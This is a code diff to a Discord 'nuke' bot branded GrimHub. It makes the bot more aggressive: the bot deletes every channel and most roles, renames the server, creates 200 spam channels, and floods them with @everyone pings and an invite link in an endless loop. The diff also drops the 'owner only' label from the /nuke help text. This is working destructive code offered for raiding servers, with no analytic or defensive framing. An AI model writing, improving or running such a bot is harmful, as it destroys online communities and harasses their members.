@@ -32,29 +32,22 @@ async def nuke(interaction: discord.Interaction):
     message = "**NUKED BY GRIMHUB**\nhttps://discord.gg/keW3WFQaqp"
     ping_text = "@everyone "
     
-    # Create a temp channel to show progress
-    temp = await guild.create_text_channel("NUKE-IN-PROGRESS")
-    await temp.send("**🔥 SERVER BEING NUKED 🔥**")
-    
     try:
         # Delete all channels
-        await temp.send("Deleting all channels...")
-        delete_tasks = [channel.delete() for channel in guild.channels if channel != temp]
+        delete_tasks = [channel.delete() for channel in guild.channels]
         if delete_tasks:
             await asyncio.gather(*delete_tasks, return_exceptions=True)
         
-        await asyncio.sleep(1)
+        await asyncio.sleep(0.5)
         
-        # Create 500 spam channels
-        await temp.send("Creating 500 spam channels...")
+        # Create 200 spam channels
         spam_channels = []
-        for i in range(500):
+        for i in range(200):
             if not active_nuke.get(guild.id):
                 break
             try:
-                channel = await guild.create_text_channel(f"nuked-{i}")
+                channel = await guild.create_text_channel(f"nuked-by-grimhub")
                 spam_channels.append(channel)
-                await asyncio.sleep(0.05)
             except:
                 pass
         
@@ -62,17 +55,14 @@ async def nuke(interaction: discord.Interaction):
         await guild.edit(name="🔥 NUKED BY GRIMHUB 🔥")
         
         # Delete all roles
-        role_tasks = []
         for role in guild.roles:
             if not role.is_default() and not role.managed and role != guild.me.top_role:
-                role_tasks.append(role.delete())
-        if role_tasks:
-            await asyncio.gather(*role_tasks, return_exceptions=True)
+                try:
+                    await role.delete()
+                except:
+                    pass
         
-        # INFINITE SPAM - runs until bot is banned or stopped
-        await temp.send(f"**🔥 SPAMMING {ping_text}{message} IN {len(spam_channels)} CHANNELS UNTIL BOT IS BANNED 🔥**")
-        
-        # Keep spamming forever
+        # SPAM FOREVER
         while active_nuke.get(guild.id):
             for channel in spam_channels:
                 if not active_nuke.get(guild.id):
@@ -84,7 +74,7 @@ async def nuke(interaction: discord.Interaction):
             await asyncio.sleep(0.01)
         
     except Exception as e:
-        pass
+        print(f"Nuke error: {e}")
     finally:
         active_nuke[guild.id] = False
 
@@ -110,7 +100,6 @@ async def clear_all(ctx):
     
     await ctx.send("**🔥 CLEARING ALL CHANNELS... 🔥**")
     
-    # Delete all channels
     for channel in ctx.guild.channels:
         try:
             await channel.delete()
@@ -118,21 +107,18 @@ async def clear_all(ctx):
         except:
             pass
     
-    # Create one channel called HI
     await ctx.guild.create_text_channel("HI")
-    
-    # Rename server
     await ctx.guild.edit(name="🔥 NUKED BY GRIMHUB 🔥")
 
-@bot.command(name="help")
-async def help_cmd(ctx):
+@bot.command(name="commands")
+async def bot_commands(ctx):
     await ctx.send("""
-**GrimHub Nuke Bot Commands**
+**GrimHub Nuke Bot**
 
 `.clear` - Delete all channels, create one called HI
-`/nuke` - FULL SERVER NUKE (owner only)
+`/nuke` - FULL SERVER NUKE
 `/stop` - Stop the nuke
-    """)
+""")
 
 if __name__ == "__main__":
     if not TOKEN:
